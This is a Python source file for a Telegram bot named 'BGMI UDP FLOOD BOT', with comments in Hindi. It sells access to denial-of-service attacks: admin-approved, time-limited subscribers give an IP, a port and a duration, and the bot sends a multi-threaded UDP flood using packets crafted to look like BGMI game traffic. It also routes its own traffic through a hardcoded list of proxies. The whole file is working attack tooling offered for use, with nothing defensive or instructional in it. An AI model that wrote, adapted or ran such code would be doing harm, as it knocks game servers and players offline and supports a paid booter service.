import os
import sys
import socket
import random
import time
import threading
import logging
from datetime import datetime, timedelta

import telebot
import pytz
import certifi
from pymongo import MongoClient

# ========== कॉन्फ़िग (Enviroment Variables से) ==========
BOT_TOKEN = os.getenv("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://user:pass@cluster.mongodb.net/")
ADMIN_ID = int(os.getenv("ADMIN_ID", "123456789"))

# 🔥 मल्टी-बॉट सपोर्ट – अगर RUNNER_ID सेट है तो उसी के हिसाब से टोकन लो
RUNNER_ID = os.getenv("RUNNER_ID", "1")
BOT_TOKEN_KEY = f"BOT_TOKEN_{RUNNER_ID}"
if os.getenv(BOT_TOKEN_KEY):
    BOT_TOKEN = os.getenv(BOT_TOKEN_KEY)
    logging.info(f"✅ Using dedicated bot token for runner {RUNNER_ID}")

# ========== MongoDB ==========
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client["attack_bot"]
users_collection = db["users"]

# ========== बॉट सेटअप ==========
bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

# ========== 🔥 PROXY SUPPORT (हर रनर के लिए अलग) ==========
PROXY_LIST = [
    "http://45.155.205.233:3128",
    "http://188.166.101.12:8118",
    "http://159.203.119.56:3128",
    "http://192.111.135.18:4145",
    "http://45.229.72.97:8080",
    "http://103.169.142.114:8080",
    "http://103.152.112.120:8080",
    "http://51.79.77.250:8191",
    "http://45.137.107.235:3128",
    "http://103.167.240.212:8080",
]

# रनर ID के हिसाब से प्रॉक्सी चुनो (ताकि हर रनर अलग प्रॉक्सी इस्तेमाल करे)
proxy_index = (int(RUNNER_ID) - 1) % len(PROXY_LIST)
PROXY_URL = PROXY_LIST[proxy_index]
telebot.apihelper.proxy = {'https': PROXY_URL}
logging.info(f"🌐 Using proxy: {PROXY_URL}")

# ========== 🔥 BGMI-स्पेसिफिक पेलोड (Game Payloads) ==========
def create_bgmi_payload(size=1400):
    """
    BGMI (Unreal Engine 4) के लिए स्पेसिफिक पैकेट बनाएँ।
    - पहले 4 बाइट्स: गेम की 'magic' हेडर (0x00 0x00 0x00 0x00 - आमतौर पर UE4 इससे शुरू होता है)
    - अगले 2 बाइट्स: ऑपकोड (0x01 0x00 = Connect/Query)
    - बाकी रैंडम फिलर
    """
    header = b'\x00\x00\x00\x00'          # Magic header
    opcode = b'\x01\x00'                  # Query/Connect
    filler_len = size - len(header) - len(opcode)
    filler = random._urandom(filler_len)
    return header + opcode + filler

# अतिरिक्त वैरिएंट – पुराने सोर्स इंजन स्टाइल (अगर काम न करे तो)
def create_source_query_payload():
    # CS:GO / Source Engine A2S_INFO query
    return bytes.fromhex('FFFFFFFF54536F7572636520456E67696E6520517565727900')

# हर थ्रेड किसी भी पेलोड को इस्तेमाल कर सकता है – हम रैंडमाइज कर देंगे
PAYLOAD_TYPES = [
    lambda: create_bgmi_payload(1400),
    lambda: create_bgmi_payload(1200),
    lambda: create_bgmi_payload(800),
    lambda: random._urandom(1400),  # फॉलबैक
]

def get_random_payload():
    return random.choice(PAYLOAD_TYPES)()  # हर कॉल पर अलग पेलोड

# ========== ग्लोबल वेरिएबल्स ==========
THREADS_PER_RUNNER = 10          # हर रनर 10 थ्रेड्स
BLOCKED_PORTS = [443, 8443, 8700, 20000, 17500, 9031, 20002, 20001]
MAX_DURATION = 300
attack_in_progress = False
attack_stop_event = threading.Event()
attack_start_time = 0
attack_duration = 0
active_threads = []

# ========== यूज़र वेरिफिकेशन ==========
def is_user_approved(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        return False
    valid_until_str = user.get("valid_until")
    if valid_until_str:
        try:
            valid_until = datetime.strptime(valid_until_str, "%Y-%m-%d")
            if datetime.now().date() > valid_until.date():
                users_collection.delete_one({"user_id": user_id})
                return False
        except:
            pass
    return True

# ========== अटैक इंजन (BGMI पेलोड के साथ) ==========
def udp_worker(ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
    while not stop_event.is_set():
        try:
            # 🔥 हर बार नया पेलोड (BGMI स्टाइल + रैंडम मिक्स)
            payload = get_random_payload()
            sock.sendto(payload, (ip, port))
        except:
            pass
    sock.close()

def start_attack(ip, port, duration):
    global attack_in_progress, attack_start_time, attack_duration, active_threads
    attack_in_progress = True
    attack_start_time = time.time()
    attack_duration = duration
    attack_stop_event.clear()
    active_threads = []

    for _ in range(THREADS_PER_RUNNER):
        t = threading.Thread(target=udp_worker, args=(ip, port, attack_stop_event))
        t.daemon = True
        t.start()
        active_threads.append(t)

    time.sleep(duration)
    stop_attack()

def stop_attack():
    global attack_in_progress
    attack_in_progress = False
    attack_stop_event.set()

# ========== काउंटडाउन अपडेट ==========
def update_attack_message(chat_id, message_id, target_ip, target_port, duration):
    global attack_in_progress
    last_text = ""
    for remaining in range(duration, -1, -1):
        if not attack_in_progress:
            break
        if remaining == 0:
            text = f"✅ *Attack Completed!*\n🎯 `{target_ip}:{target_port}`\n⏱ {duration}s"
        else:
            text = (f"🚀 *Attack in Progress*\n"
                    f"🎯 `{target_ip}:{target_port}`\n"
                    f"⏳ `{remaining}`s left\n"
                    f"🧵 {THREADS_PER_RUNNER} threads\n"
                    f"🌐 Proxy: {PROXY_URL[:20]}...")
        if text != last_text:
            try:
                bot.edit_message_text(text, chat_id=chat_id, message_id=message_id, parse_mode='Markdown')
                last_text = text
            except:
                pass
        time.sleep(1)

# ========== टेलीग्राम कमांड्स ==========
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, 
                 "🔥 *BGMI UDP FLOOD BOT*\n"
                 "📌 `/attack <IP> <PORT> <DURATION>`\n"
                 "🛑 `/stop` - रोको\n"
                 "ℹ️ `/myinfo` - अपनी डिटेल\n"
                 "👑 एडमिन: `/approve` & `/disapprove`", 
                 parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    global attack_in_progress
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_approved(user_id):
        bot.reply_to(message, "🚫 *Access Denied!* Contact Admin @VIPXOWNER8", parse_mode='Markdown')
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "⚠️ *Format:* `/attack <IP> <PORT> <DURATION>`", parse_mode='Markdown')
        return

    ip, port_str, dur_str = args[1], args[2], args[3]
    try:
        port = int(port_str)
        duration = int(dur_str)
    except:
        bot.reply_to(message, "❌ PORT और DURATION Numbers होने चाहिए।")
        return

    if port in BLOCKED_PORTS:
        bot.reply_to(message, f"🔒 Port `{port}` Blocked है।", parse_mode='Markdown')
        return

    if duration > MAX_DURATION:
        bot.reply_to(message, f"⏳ Max {MAX_DURATION} seconds.", parse_mode='Markdown')
        return

    if attack_in_progress:
        bot.reply_to(message, "⚠️ पहले से अटैक चल रहा। `/stop` करो।", parse_mode='Markdown')
        return

    sent_msg = bot.send_message(chat_id, f"🚀 *अटैक शुरू*\n🎯 `{ip}:{port}`\n⏱ {duration}s", parse_mode='Markdown')
    updater = threading.Thread(target=update_attack_message, args=(chat_id, sent_msg.message_id, ip, port, duration))
    updater.daemon = True
    updater.start()

    attack_thread = threading.Thread(target=start_attack, args=(ip, port, duration))
    attack_thread.daemon = True
    attack_thread.start()

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global attack_in_progress
    if attack_in_progress:
        stop_attack()
        bot.reply_to(message, "🛑 *अटैक रोका गया।*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ कोई अटैक नहीं।")

@bot.message_handler(commands=['when'])
def when_cmd(message):
    if attack_in_progress:
        elapsed = time.time() - attack_start_time
        remaining = attack_duration - elapsed
        if remaining > 0:
            bot.reply_to(message, f"⏳ *बचा हुआ:* `{int(remaining)}` सेकंड", parse_mode='Markdown')
        else:
            bot.reply_to(message, "✅ अटैक खत्म।")
    else:
        bot.reply_to(message, "❌ कोई अटैक नहीं।")

@bot.message_handler(commands=['myinfo'])
def myinfo_cmd(message):
    user_id = message.from_user.id
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        bot.reply_to(message, "⚠️ *अकाउंट नहीं मिला।* Admin से संपर्क करें।", parse_mode='Markdown')
        return
    plan = user.get("plan", "N/A")
    valid_until = user.get("valid_until", "N/A")
    bot.reply_to(message, f"👤 *ID:* `{user_id}`\n📋 *Plan:* `{plan}`\n📅 *Valid Till:* `{valid_until}`", parse_mode='Markdown')

# ========== एडमिन कमांड्स ==========
@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Only Admin.")
        return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "⚠️ `/approve <user_id> <days>`")
        return
    try:
        target_id = int(args[1])
        days = int(args[2])
    except:
        bot.reply_to(message, "❌ Invalid Input.")
        return
    valid_until = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    users_collection.update_one(
        {"user_id": target_id},
        {"$set": {"user_id": target_id, "plan": 1, "valid_until": valid_until, "approved_by": ADMIN_ID}},
        upsert=True
    )
    bot.reply_to(message, f"✅ User `{target_id}` Approved for {days} days.", parse_mode='Markdown')

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Only Admin.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "⚠️ `/disapprove <user_id>`")
        return
    try:
        target_id = int(args[1])
    except:
        bot.reply_to(message, "❌ Invalid ID.")
        return
    users_collection.delete_one({"user_id": target_id})
    bot.reply_to(message, f"🗑 User `{target_id}` Removed.", parse_mode='Markdown')

# ========== पोलिंग ==========
if __name__ == "__main__":
    logging.info("🤖 Bot started polling...")
    try:
        bot.infinity_polling(timeout=10)
    except Exception as e:
        logging.error(f"Polling error: {e}")
